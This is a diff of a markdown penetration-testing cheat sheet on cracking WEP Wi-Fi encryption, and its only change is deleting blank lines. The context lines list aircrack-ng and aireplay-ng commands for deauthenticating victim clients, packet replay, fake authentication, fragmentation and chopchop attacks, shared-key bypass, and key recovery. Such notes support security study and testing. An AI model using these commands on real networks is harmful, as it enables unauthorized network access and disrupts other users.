@@ -23,7 +23,6 @@ aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
 aircrack-ng arpreplay.cap
 ```
 
-
 ### Interactive replay attack
 
 > Attack a client to force new packets 0841 attack, or interactive packet replay is a WEP attack that allows for packet injection when ARP replay is not available/working.
@@ -52,7 +51,6 @@ aircrack-ng -0 -z -n 64 clientwep-01.cap
 aireplay-ng -2 -r replay.cap mon0
 ```
 
-
 ## Cracking WEP without a Client
 
 * Chopchop & Fragmentation attack => PRGA, generate more packets with weak IVs
@@ -69,7 +67,6 @@ airodump-ng -c 3 --bssid $AP_MAC -w wepcrack mon0 # see no client
 aireplay-ng -1 60 -e $AP_SSID -b $AP_MAC -h $ATTACKER_MAC mon0 # should see a client in airodump
 # -1 6000 to avoid a time out.
 ```
-
 
 ### Fragmentation attack
 
@@ -103,7 +100,6 @@ aircrack-ng -0 wepcrack
 aircrack-ng -n 64 <capture filename>
 ```
 
-
 ### KoreK Chopchop attack
 
 > Can't be used for every AP, might work when fragmentation fails Much slower than the fragmentation attack
@@ -129,7 +125,6 @@ aireplay-ng -2 -r chochop_out.cap mon0
 # crack the WEP key
 aircrack-ng -0 wepcrack
 ```
-
 
 ## Bypassing WEP Shared Key Authentication SKA
 
@@ -168,7 +163,6 @@ aireplay-ng -0 1 -a $AP_MAC -c $VICTIM_MAC mon0
 # crack the WEP key
 aircrack-ng sharedkey.cap
 ```
-
 
 ## References
 
